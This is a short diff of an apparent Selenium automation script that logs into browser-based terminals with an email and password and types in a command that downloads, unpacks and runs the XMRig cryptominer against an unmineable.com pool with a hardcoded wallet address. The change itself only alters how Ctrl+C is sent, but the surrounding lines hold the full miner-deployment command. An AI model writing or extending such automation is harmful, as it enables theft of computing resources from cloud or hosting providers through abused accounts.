@@ -106,9 +106,8 @@ def open_browser(instance_number, email, password):
     
     try:
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
-        print("SUCCES")        
-        actions = ActionChains(driver)
-        actions.key_down(Keys.CONTROL).send_keys('C').key_up(Keys.CONTROL).perform()
+        print("SUCCES")    
+        textarea1.send_keys(Keys.CONTROL + 'c')
         textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u DGB:DNHoBzrGr7GUfufUijUqTMFSCYY1nNytRy.{email}#nar4-zk5q -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
     except:
